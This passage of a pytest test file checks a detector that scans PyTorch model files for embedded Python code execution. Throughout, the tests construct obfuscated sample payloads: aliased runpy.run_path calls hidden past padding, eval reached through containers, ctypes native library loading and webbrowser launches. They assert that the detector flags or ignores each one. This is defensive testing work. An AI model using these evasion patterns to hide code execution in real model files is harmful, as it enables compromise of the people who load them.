        filler_line = b"# filler\n"
        filler = filler_line * (2 * jit_script_module._EMBEDDED_PYTHON_SCAN_WINDOW_BYTES // len(filler_line) + 1)
        source = (
            b"\x00\xffimport runpy as rp\n" + filler + b"\x00\xffdef payload():\n    return rp.run_path('payload.py')\n"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_detects_parenthesized_tail_alias_with_prefix_context(self) -> None:
        detector = JITScriptDetector()
        filler_line = b"# filler\n"
        filler = filler_line * (2 * jit_script_module._EMBEDDED_PYTHON_SCAN_WINDOW_BYTES // len(filler_line) + 1)
        source = (
            b"\x00\xffimport runpy as rp\n"
            + filler
            + b"\x00\xffdef payload():\n    return ((rp).run_path)('payload.py')\n"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_detects_multiline_parenthesized_tail_alias_with_prefix_context(self) -> None:
        detector = JITScriptDetector()
        filler_line = b"# filler\n"
        filler = filler_line * (2 * jit_script_module._EMBEDDED_PYTHON_SCAN_WINDOW_BYTES // len(filler_line) + 1)
        source = (
            b"\x00\xffimport runpy as rp\n"
            + filler
            + b"\x00\xffdef payload():\n    return (\n        rp.run_path\n    )('payload.py')\n"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_detects_tail_alias_after_noisy_prefix_context_budget(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        detector = JITScriptDetector()
        monkeypatch.setattr(jit_script_module, "_EMBEDDED_PYTHON_SCAN_WINDOW_BYTES", 4096)
        long_alias = "unused_" + "x" * 900
        noise = b"".join(f"import runpy as {long_alias}_{index}\n".encode() for index in range(20))
        filler_line = b"# filler\n"
        filler = filler_line * (2 * jit_script_module._EMBEDDED_PYTHON_SCAN_WINDOW_BYTES // len(filler_line) + 1)
        source = (
            b"\x00\xff"
            + noise
            + b"import runpy as rp\n"
            + filler
            + b"def payload():\n    return rp.run_path('payload.py')\n"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_detects_tail_alias_call_from_prefix_annotated_assignment_context(self) -> None:
        detector = JITScriptDetector()
        filler_line = b"# filler\n"
        filler = filler_line * (2 * jit_script_module._EMBEDDED_PYTHON_SCAN_WINDOW_BYTES // len(filler_line) + 1)
        source = (
            b"\x00\xffimport runpy\nrun: object = runpy.run_path\n"
            + filler
            + b"def payload():\n    return run('payload.py')\n"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_detects_tail_module_alias_from_prefix_assignment_context(self) -> None:
        detector = JITScriptDetector()
        filler_line = b"# filler\n"
        filler = filler_line * (2 * jit_script_module._EMBEDDED_PYTHON_SCAN_WINDOW_BYTES // len(filler_line) + 1)
        source = (
            b"\x00\xffimport runpy\nrp = runpy\n" + filler + b"def payload():\n    return rp.run_path('payload.py')\n"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_detects_tail_alias_call_from_prefix_unpack_assignment_context(self) -> None:
        detector = JITScriptDetector()
        filler_line = b"# filler\n"
        filler = filler_line * (2 * jit_script_module._EMBEDDED_PYTHON_SCAN_WINDOW_BYTES // len(filler_line) + 1)
        source = (
            b"\x00\xffimport runpy\n(run,) = (runpy.run_path,)\n"
            + filler
            + b"def payload():\n    return run('payload.py')\n"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    @pytest.mark.parametrize(
        ("assignment", "call"),
        [
            (b"callbacks = [eval]\n", b"callbacks[0]('1+1')"),
            (b"callbacks = {'run': eval}\n", b"callbacks['run']('1+1')"),
        ],
    )
    def test_scan_model_detects_tail_builtin_call_from_prefix_container_context(
        self,
        assignment: bytes,
        call: bytes,
    ) -> None:
        detector = JITScriptDetector()
        filler_line = b"# filler\n"
        filler = filler_line * (2 * jit_script_module._EMBEDDED_PYTHON_SCAN_WINDOW_BYTES // len(filler_line) + 1)
        source = b"\x00\xff" + assignment + filler + b"def payload():\n    return " + call + b"\n"

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(finding.type == "dangerous_builtin" and finding.builtin == "eval" for finding in findings)

    def test_scan_model_ignores_overwritten_prefix_container_context(self) -> None:
        detector = JITScriptDetector()
        filler_line = b"# filler\n"
        filler = filler_line * (2 * jit_script_module._EMBEDDED_PYTHON_SCAN_WINDOW_BYTES // len(filler_line) + 1)
        source = (
            b"\x00\xffcallbacks = [eval]\n"
            b"callbacks[0] = len\n" + filler + b"def benign():\n    return callbacks[0]('1+1')\n"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert not any(finding.type == "dangerous_builtin" for finding in findings)

    def test_scan_model_detects_tail_call_from_prefix_module_alias_context(self) -> None:
        detector = JITScriptDetector()
        filler_line = b"# filler\n"
        filler = filler_line * (2 * jit_script_module._EMBEDDED_PYTHON_SCAN_WINDOW_BYTES // len(filler_line) + 1)
        source = (
            b"\x00\xffimport runpy\nrp = runpy\n" + filler + b"def payload():\n    return rp.run_path('payload.py')\n"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_detects_tail_call_from_literal_true_compound_import_context(self) -> None:
        detector = JITScriptDetector()
        filler_line = b"# filler\n"
        filler = filler_line * (2 * jit_script_module._EMBEDDED_PYTHON_SCAN_WINDOW_BYTES // len(filler_line) + 1)
        source = (
            b"\x00\xffif True: import runpy as rp\n"
            + filler
            + b"def payload():\n    return rp.run_path('payload.py')\n"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_detects_tail_one_hop_alias_after_prefix_from_import(self) -> None:
        detector = JITScriptDetector()
        filler_line = b"# filler\n"
        filler = filler_line * (2 * jit_script_module._EMBEDDED_PYTHON_SCAN_WINDOW_BYTES // len(filler_line) + 1)
        source = (
            b"\x00\xfffrom runpy import run_path\nrun = run_path\n"
            + filler
            + b"def payload():\n    return run('payload.py')\n"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_detects_framed_tail_snippet_with_prefix_alias_context(self) -> None:
        detector = JITScriptDetector()
        filler_line = b"# filler\n"
        filler = filler_line * (2 * jit_script_module._EMBEDDED_PYTHON_SCAN_WINDOW_BYTES // len(filler_line) + 1)
        source = (
            b"\x00\xffimport runpy as rp\n" + filler + b"\x00\xffdef payload():\n    return rp.run_path('payload.py')\n"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_detects_prefix_alias_call_after_middle_tail_start(self) -> None:
        detector = JITScriptDetector()
        filler_line = b"# filler\n"
        filler = filler_line * (2 * jit_script_module._EMBEDDED_PYTHON_SCAN_WINDOW_BYTES // len(filler_line) + 1)
        harmless_tail = b"".join(
            f"def harmless_{index}():\n    return {index}\n}}\x00".encode()
            for index in range(2 * jit_script_module._MAX_DEFAULT_EMBEDDED_PYTHON_SNIPPETS + 4)
        )
        source = (
            b"\x00\xffimport runpy as rp\n"
            + filler
            + harmless_tail
            + b"def payload():\n    return rp.run_path('payload.py')\n"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_does_not_hoist_function_local_prefix_import_into_tail_context(self) -> None:
        detector = JITScriptDetector()
        filler_line = b"# filler\n"
        filler = filler_line * (2 * jit_script_module._EMBEDDED_PYTHON_SCAN_WINDOW_BYTES // len(filler_line) + 1)
        source = (
            b"\x00\xffdef helper():\n"
            b"    import runpy as rp\n" + filler + b"def payload():\n"
            b"    import os\n"
            b"    return rp.run_path('payload.py')\n"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert not any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_does_not_use_commented_prefix_import_as_tail_context(self) -> None:
        detector = JITScriptDetector()
        filler_line = b"# filler\n"
        filler = filler_line * (2 * jit_script_module._EMBEDDED_PYTHON_SCAN_WINDOW_BYTES // len(filler_line) + 1)
        source = b"\x00\xff# import runpy as rp\n" + filler + b"def payload():\n    return rp.run_path('payload.py')\n"

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert not any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_does_not_parse_docstring_priority_import_as_statement(self) -> None:
        detector = JITScriptDetector()
        source = b'\x00\xffdef payload():\n    """\n    import os\n    """\n    return 1\n\x00MODEL-FRAMING'

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert not any(f.type in {"dangerous_import", "code_execution_pattern"} for f in findings)

    def test_scan_model_ignores_late_priority_alias_use_inside_multiline_string_with_trigger(self) -> None:
        detector = JITScriptDetector()
        leading_blocks = b"".join(
            f"def benign_{index}():\n    return {index}\n}}\x00".encode()
            for index in range(jit_script_module._MAX_DEFAULT_EMBEDDED_PYTHON_SNIPPETS + 2)
        )
        padding = b"# pad\n" * (jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(b"# pad\n") + 8)
        source = (
            b"\x00\xff"
            + leading_blocks
            + b"import runpy as rp\n"
            + padding
            + b'import os\ntext = """\nrp.run_path("payload.py")\n"""\n'
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert not any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_does_not_hoist_prefix_import_from_triple_quoted_string(self) -> None:
        detector = JITScriptDetector()
        filler_line = b"# filler\n"
        filler = filler_line * (2 * jit_script_module._EMBEDDED_PYTHON_SCAN_WINDOW_BYTES // len(filler_line) + 1)
        source = (
            b'\x00\xfftext = """\nimport runpy as rp\n"""\n'
            + filler
            + b"def payload():\n    return rp.run_path('payload.py')\n"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert not any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_does_not_hoist_prefix_import_after_escaped_triple_quote(self) -> None:
        detector = JITScriptDetector()
        filler_line = b"# filler\n"
        filler = filler_line * (2 * jit_script_module._EMBEDDED_PYTHON_SCAN_WINDOW_BYTES // len(filler_line) + 1)
        source = (
            b'\x00\xfftext = """\nnot close \\"""\nimport runpy as rp\n"""\n'
            + filler
            + b"def payload():\n    return rp.run_path('payload.py')\n"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert not any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_detects_real_prefix_import_after_single_quoted_triple_marker(self) -> None:
        detector = JITScriptDetector()
        filler_line = b"# filler\n"
        filler = filler_line * (2 * jit_script_module._EMBEDDED_PYTHON_SCAN_WINDOW_BYTES // len(filler_line) + 1)
        source = (
            b'\x00\xffmarker = \'"""\'\nimport runpy as rp\n'
            + filler
            + b"def payload():\n    return rp.run_path('payload.py')\n"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_detects_tail_import_after_comment_line_closes_triple_quote(self) -> None:
        detector = JITScriptDetector()
        filler_line = b"# filler\n"
        filler = filler_line * (2 * jit_script_module._EMBEDDED_PYTHON_SCAN_WINDOW_BYTES // len(filler_line) + 1)
        source = (
            b'\x00\xfftext = """\n# closes """\nimport runpy as rp\n'
            + filler
            + b"def payload():\n    return rp.run_path('payload.py')\n"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_detects_restored_runpy_execution_after_static_overwrite(self) -> None:
        detector = JITScriptDetector()
        source = (
            b"def payload():\n"
            b"    original = runpy.run_path\n"
            b"    runpy.run_path = len\n"
            b"    runpy.run_path = original\n"
            b"    return runpy.run_path('payload.py')\n"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_priority_snippets_require_import_boundaries_after_cap(self) -> None:
        def candidate(
            value: tuple[bytes, tuple[int, int]],
        ) -> tuple[bytes, tuple[int, int], tuple[tuple[int, int], ...]]:
            return value[0], value[1], (value[1],)

        leading_candidates = [
            candidate((f"import harmless_{index}\n".encode(), (index, index + 1)))
            for index in range(jit_script_module._MAX_DEFAULT_EMBEDDED_PYTHON_SNIPPETS)
        ]
        host_candidate = candidate((b"import host_123\n", (100, 101)))
        system_candidate = candidate((b"class System:\n    pass\n", (200, 201)))
        os_candidate = candidate((b"import os\n", (300, 301)))
        aliased_runpy_candidate = candidate((b"import harmless as h, runpy as rp\n", (350, 351)))
        continued_runpy_candidate = candidate((b"import harmless as h, \\\n    runpy as rp\n", (375, 376)))
        continued_from_runpy_candidate = candidate((b"from runpy\\\n import run_path\n", (400, 401)))
        runpy_candidate = candidate((b"from runpy import run_path\n", (425, 426)))

        selected = jit_script_module._prioritized_embedded_python_snippets(
            [
                *leading_candidates,
                host_candidate,
                system_candidate,
                os_candidate,
                aliased_runpy_candidate,
                continued_runpy_candidate,
                continued_from_runpy_candidate,
                runpy_candidate,
            ]
        )

        selected_candidates = {candidate for candidate, _span, _real_ranges in selected}
        assert host_candidate[0] not in selected_candidates
        assert system_candidate[0] not in selected_candidates
        assert os_candidate[0] in selected_candidates
        assert aliased_runpy_candidate[0] in selected_candidates
        assert continued_runpy_candidate[0] in selected_candidates
        assert continued_from_runpy_candidate[0] in selected_candidates
        assert runpy_candidate[0] in selected_candidates

    def test_prioritized_snippet_budget_counts_unique_spans(self) -> None:
        duplicate = (b"import harmless\n", (0, 16), ((0, 16),))
        unique = (b"import later\n", (20, 32), ((20, 32),))

        selected, omitted_spans = jit_script_module._select_prioritized_embedded_python_snippets(
            [*[duplicate] * jit_script_module._MAX_DEFAULT_EMBEDDED_PYTHON_SNIPPETS, unique]
        )

        assert selected == [duplicate, unique]
        assert omitted_spans == []

    def test_priority_snippets_are_budgeted_and_bounded_after_default_cap(self) -> None:
        def candidate(
            value: tuple[bytes, tuple[int, int]],
        ) -> tuple[bytes, tuple[int, int], tuple[tuple[int, int], ...]]:
            return value[0], value[1], (value[1],)

        leading_candidates = [
            candidate((f"import harmless_{index}\n".encode(), (index, index + 1)))
            for index in range(jit_script_module._MAX_DEFAULT_EMBEDDED_PYTHON_SNIPPETS)
        ]
        priority_payload = b"import os\n" + (b"# pad\n" * 4000)
        priority_candidates = [
            candidate(
                (
                    priority_payload,
                    (
                        1_000 + index * len(priority_payload),
                        1_000 + (index + 1) * len(priority_payload),
                    ),
                )
            )
            for index in range(jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPETS + 4)
        ]

        selected = jit_script_module._prioritized_embedded_python_snippets([*leading_candidates, *priority_candidates])

        assert len(selected) == (
            jit_script_module._MAX_DEFAULT_EMBEDDED_PYTHON_SNIPPETS
            + jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPETS
        )
        priority_selected = selected[jit_script_module._MAX_DEFAULT_EMBEDDED_PYTHON_SNIPPETS :]
        assert all(
            len(candidate) <= jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES
            for candidate, _span, _real_ranges in priority_selected
        )

    def test_candidate_extraction_bounds_dense_assignments_and_keeps_late_priority_import(self) -> None:
        assignments = b"".join(f"value_{index} = {index}\n".encode() for index in range(1_000))
        priority_source = b"import runpy as rp\nrp.run_path('payload.py')\n"
        source = assignments + priority_source

        candidates = jit_script_module._candidate_embedded_python_snippets(source)

        assert len(candidates) <= jit_script_module._MAX_EMBEDDED_PYTHON_SOURCE_START_PROBES + 2
        assert any(bytes(candidate).startswith(b"import runpy as rp\n") for candidate, _span, _ranges in candidates)

    def test_scan_model_ignores_binary_framed_top_level_replaced_runpy_execution(self) -> None:
        detector = JITScriptDetector()
        source = b"\x00\xffimport runpy\nrunpy.run_path = len\nrunpy.run_path([])\n\x00MODEL-FRAMING"

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert not any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_detects_binary_framed_long_tail_alias_aware_runpy_execution(self) -> None:
        detector = JITScriptDetector()
        tail = b"\n".join(b"tail" for _ in range(jit_script_module._MAX_SNIPPET_PARSE_TRIM_ATTEMPTS + 20))
        source = (
            b"\x00\xffdef payload():\n    from runpy import run_path as run\n    return run('payload.py')\n\x00" + tail
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_ignores_binary_prefixed_replaced_runpy_execution(self) -> None:
        detector = JITScriptDetector()
        source = b"\x00\xffdef payload():\n    import runpy\n    runpy.run_path = len\n    return runpy.run_path([])\n"

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert findings == []

    def test_scan_model_ignores_lossy_decoded_string_literal_runpy_execution(self) -> None:
        detector = JITScriptDetector()
        source = (
            b"\x00\xffdef payload():\n"
            b"    # ignored invalid bytes: "
            + (b"\xff" * 64)
            + b"\n    return \"runpy.run_path('payload.py')\"\n\x00\xffMODEL-FRAMING"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert not any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_ignores_framed_runpy_call_inside_multiline_literal(self) -> None:
        detector = JITScriptDetector()
        source = b"\x00\xffimport runpy as rp\npayload = '''\n\x00\xff((rp).run_path)('safe')\n'''\n"

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert not any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_preserves_raw_runpy_match_after_benign_parsed_snippet(self) -> None:
        detector = JITScriptDetector()
        source = (
            b"def benign():\n"
            b"    return \"runpy.run_path('payload.py')\"\n"
            b"}\n"
            b"def payload():\n"
            b"if True print('broken')\n"
            b"runpy.run_path('payload.py')\n"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_detects_binary_framed_webbrowser_and_ctypes_calls(self) -> None:
        detector = JITScriptDetector()
        source = (
            b"\x00\xffdef payload():\n"
            b"    import builtins\n"
            b"    import ctypes\n"
            b"    import os\n"
            b"    import webbrowser\n"
            b"    webbrowser.get().open.__call__('https://example.invalid')\n"
            b"    webbrowser.get().__getattribute__('open')('https://example.invalid')\n"
            b"    ctypes.windll.kernel32\n"
            b"    ctypes.cdll['msvcrt'].printf(b'x')\n"
            b"    ctypes.cdll.__getitem__('msvcrt')\n"
            b"    loader = ctypes.LibraryLoader(ctypes.CDLL)\n"
            b"    loader_kw = ctypes.LibraryLoader(dlltype=ctypes.CDLL)\n"
            b"    loader_alias = ctypes.LibraryLoader(ctypes.cdll._dlltype)\n"
            b"    loader_method = ctypes.LibraryLoader(ctypes.CDLL)\n"
            b"    loader.msvcrt.printf(b'x')\n"
            b"    loader_kw.payload.printf(b'x')\n"
            b"    loader_alias.aliaslib.printf(b'x')\n"
            b"    loader_method.LoadLibrary('methodlib')\n"
            b"    loader_method.__getitem__('getitemlib')\n"
            b"    loader_method.LoadLibrary(name='keywordlib')\n"
            b"    loader_method.__getitem__(name='keywordgetitem')\n"
            b"    loader_variable = ctypes.LibraryLoader(ctypes.CDLL)\n"
            b"    library_name = 'variablelib'\n"
            b"    loader_variable.LoadLibrary(library_name)\n"
            b"    loader_variable.__getitem__(library_name)\n"
            b"    ctypes.LibraryLoader.LoadLibrary(ctypes.cdll, 'unboundlib')\n"
            b"    ctypes.LibraryLoader.__getitem__(ctypes.cdll, 'unboundgetitem')\n"
            b"    ctypes.LibraryLoader.LoadLibrary(self=ctypes.cdll, name='selfkeywordlib')\n"
            b"    ctypes.LibraryLoader.__getitem__(self=ctypes.cdll, name='selfkeywordgetitem')\n"
            b"    object.__getattribute__(ctypes.cdll, 'LoadLibrary')('objectmethodlib')\n"
            b"    object.__getattribute__(ctypes.cdll, '__getitem__')('objectgetitem')\n"
            b"    ctypes.windll.kernel32 = len\n"
            b"    ctypes.windll.__getattr__('kernel32')\n"
            b"    loader_conditional = ctypes.LibraryLoader(ctypes.CDLL)\n"
            b"    conditional_load = loader_conditional.LoadLibrary\n"
            b"    if flag:\n"
            b"        conditional_load = ctypes.LibraryLoader\n"
            b"    conditional_load('conditionalmethod')\n"
            b"    ctypes.cdll.augmented += 1\n"
            b"    loader_augmented = ctypes.LibraryLoader(ctypes.CDLL)\n"
            b"    loader_augmented.augmented += 1\n"
            b"    class MyCDLL(ctypes.CDLL):\n"
            b"        pass\n"
            b"    ctypes.LibraryLoader(MyCDLL).subclasslib\n"
            b"    getattr(ctypes.windll, 'user32')\n"
            b"    ctypes.windll.__getattr__('advapi32')\n"
            b"    ctypes.cdll.__getattr__(name='keywordgetattr')\n"
            b"    ctypes.LibraryLoader(*(ctypes.CDLL,)).unpacklib\n"
            b"    class SafeBase:\n"
            b"        def __init__(self, name: str) -> None:\n"
            b"            self.name = name\n"
            b"    class ExplicitSuperCDLL(SafeBase, ctypes.CDLL):\n"
            b"        def __init__(self, name: str) -> None:\n"
            b"            super(SafeBase, self).__init__(name)\n"
            b"    ctypes.LibraryLoader(ExplicitSuperCDLL).superlib\n"
            b"    return getattr(ctypes.LibraryLoader(ctypes.CDLL), 'attrlib')\n"
            b"\x00MODEL-FRAMING"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        patterns = {finding.pattern for finding in findings if finding.type == "code_execution_pattern"}
        assert "Web browser launch detected" in patterns
        assert "Native library loading detected" in patterns

    def test_scan_model_preserves_dynamic_member_risk_after_conditional_overwrite(self) -> None:
        detector = JITScriptDetector()
        source = (
            b"\x00\xffdef payload():\n"
            b"    import ctypes\n"
            b"    import webbrowser\n"
            b"    browser = webbrowser.get()\n"
            b"    if replace:\n"
            b"        browser.open = len\n"
            b"        ctypes.windll.kernel32 = len\n"
            b"    browser.open('https://example.invalid')\n"
            b"    return ctypes.windll.kernel32\n"
            b"\x00MODEL-FRAMING"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        patterns = {finding.pattern for finding in findings if finding.type == "code_execution_pattern"}
        assert "Web browser launch detected" in patterns
        assert "Native library loading detected" in patterns

    def test_scan_model_keeps_webbrowser_member_overwrites_controller_local(self) -> None:
        detector = JITScriptDetector()
        source = (
            b"\x00\xffdef payload():\n"
            b"    import webbrowser\n"
            b"    safe_browser = webbrowser.get('safe')\n"
            b"    safe_browser.open = len\n"
            b"    other_browser = webbrowser.get('other')\n"
            b"    return other_browser.open('https://example.invalid')\n"
            b"\x00MODEL-FRAMING"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            finding.type == "code_execution_pattern" and finding.pattern == "Web browser launch detected"
            for finding in findings
        )

    def test_scan_model_keeps_library_loader_member_overwrites_instance_local(self) -> None:
        detector = JITScriptDetector()
        source = (
            b"\x00\xffdef payload():\n"
            b"    import ctypes\n"
            b"    safe_loader = ctypes.LibraryLoader(ctypes.CDLL)\n"
            b"    safe_loader.payload = len\n"
            b"    other_loader = ctypes.LibraryLoader(ctypes.CDLL)\n"
            b"    return other_loader.payload\n"
            b"\x00MODEL-FRAMING"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            finding.type == "code_execution_pattern" and finding.pattern == "Native library loading detected"
            for finding in findings
        )

    def test_scan_model_detects_hasattr_ctypes_load_and_local_init_alias(self) -> None:
        detector = JITScriptDetector()
        source = (
            b"\x00\xffdef payload():\n"
            b"    import ctypes\n"
            b"    hasattr(ctypes.cdll, 'hasattrlib')\n"
            b"    hasattr(ctypes.LibraryLoader(ctypes.CDLL), 'hasattrpayload')\n"
            b"    ctypes.cdll.__getattr__(name='keywordgetattr')\n"
            b"    ctypes.LibraryLoader(*(ctypes.CDLL,)).starredlib\n"
            b"    class LocalAliasCDLL(ctypes.CDLL):\n"
            b"        def __init__(self, name: str) -> None:\n"
            b"            init = ctypes.CDLL.__init__\n"
            b"            init(self, name)\n"
            b"    ctypes.LibraryLoader(LocalAliasCDLL).localaliaslib\n"
            b"    class Safe:\n"
            b"        def __init__(self, name: str) -> None:\n"
            b"            self.name = name\n"
            b"    class SkipSafeCDLL(Safe, ctypes.CDLL):\n"
            b"        def __init__(self, name: str) -> None:\n"
            b"            super(Safe, self).__init__(name)\n"
            b"    ctypes.LibraryLoader(SkipSafeCDLL).superskiplib\n"
            b"    class ClassBodyInitCDLL(Safe, ctypes.CDLL):\n"
            b"        __init__ = ctypes.CDLL.__init__\n"
            b"    ctypes.LibraryLoader(ClassBodyInitCDLL).classbodyinitlib\n"
            b"\x00MODEL-FRAMING"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            finding.type == "code_execution_pattern" and finding.pattern == "Native library loading detected"
            for finding in findings
        )

    def test_scan_model_preserves_dynamic_member_risk_after_reassignment_and_delete(self) -> None:
        detector = JITScriptDetector()
        source = (
            b"\x00\xffdef payload():\n"
            b"    import ctypes\n"
            b"    import webbrowser\n"
            b"    browser = webbrowser.get('safe')\n"
            b"    browser.open = len\n"
            b"    browser = webbrowser.get('other')\n"
            b"    browser.open('https://example.invalid')\n"
            b"    other = webbrowser.get()\n"
            b"    other.open = len\n"
            b"    del other.open\n"
            b"    other.open('https://example.invalid')\n"
            b"    loader = ctypes.LibraryLoader(ctypes.CDLL)\n"
            b"    loader.payload = len\n"
            b"    loader = ctypes.LibraryLoader(ctypes.CDLL)\n"
            b"    loader.payload\n"
            b"    other_loader = ctypes.LibraryLoader(ctypes.CDLL)\n"
            b"    other_loader.payload = len\n"
            b"    del other_loader.payload\n"
            b"    other_loader.payload\n"
            b"    ctypes.windll.payload = len\n"
            b"    del ctypes.windll.payload\n"
            b"    return ctypes.windll.payload\n"
            b"\x00MODEL-FRAMING"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        patterns = {finding.pattern for finding in findings if finding.type == "code_execution_pattern"}
        assert "Web browser launch detected" in patterns
        assert "Native library loading detected" in patterns

    def test_scan_model_detects_ctypes_cdll_subclass_class_local_initializer_alias(self) -> None:
        detector = JITScriptDetector()
        source = (
            b"\x00\xffdef payload():\n"
            b"    import ctypes\n"
            b"    class MyCDLL(ctypes.CDLL):\n"
            b"        init = ctypes.CDLL.__init__\n"
            b"        def __init__(self, name: str) -> None:\n"
            b"            self.init(name)\n"
            b"    return ctypes.LibraryLoader(MyCDLL).payload\n"
            b"\x00MODEL-FRAMING"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            finding.type == "code_execution_pattern" and finding.pattern == "Native library loading detected"
            for finding in findings
        )

    def test_scan_model_ignores_unreachable_ctypes_cdll_subclass_initializer(self) -> None:
        detector = JITScriptDetector()
        source = (
            b"\x00\xffdef payload():\n"
            b"    import ctypes\n"
            b"    class SafeCDLL(ctypes.CDLL):\n"
            b"        def __init__(self, name: str) -> None:\n"
            b"            if False:\n"
            b"                super().__init__(name)\n"
            b"    return ctypes.LibraryLoader(SafeCDLL).payload\n"
            b"\x00MODEL-FRAMING"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert not any(
            finding.type == "code_execution_pattern" and finding.pattern == "Native library loading detected"
            for finding in findings
        )

    @pytest.mark.parametrize(
        ("payload", "expected_pattern"),
        [
            (
                b"def payload():\n    import webbrowser as wb\n    return wb.open('https://example.invalid')\n",
                "Web browser launch detected",
            ),
            (
                b"def payload():\n    import ctypes as ct\n    return ct.CDLL('libpayload.so')\n",
                "Native library loading detected",
            ),
        ],
    )
    def test_scan_model_detects_late_priority_webbrowser_and_ctypes_aliases(
        self, payload: bytes, expected_pattern: str
    ) -> None:
        detector = JITScriptDetector()
        leading_blocks = b"".join(
            f"def benign_{index}():\n    return {index}\n\x00".encode()
            for index in range(jit_script_module._MAX_DEFAULT_EMBEDDED_PYTHON_SNIPPETS + 2)
        )
        source = b"\x00\xff" + leading_blocks + payload

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(f.type == "code_execution_pattern" and f.pattern == expected_pattern for f in findings)

    def test_scan_model_ignores_safe_webbrowser_get_overwrite(self) -> None:
        detector = JITScriptDetector()
        source = (
            b"\x00\xffdef payload():\n"
            b"    import webbrowser\n"
            b"    webbrowser.get = len\n"
            b"    return webbrowser.get([]).open('https://example.invalid')\n"
            b"\x00MODEL-FRAMING"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert not any(
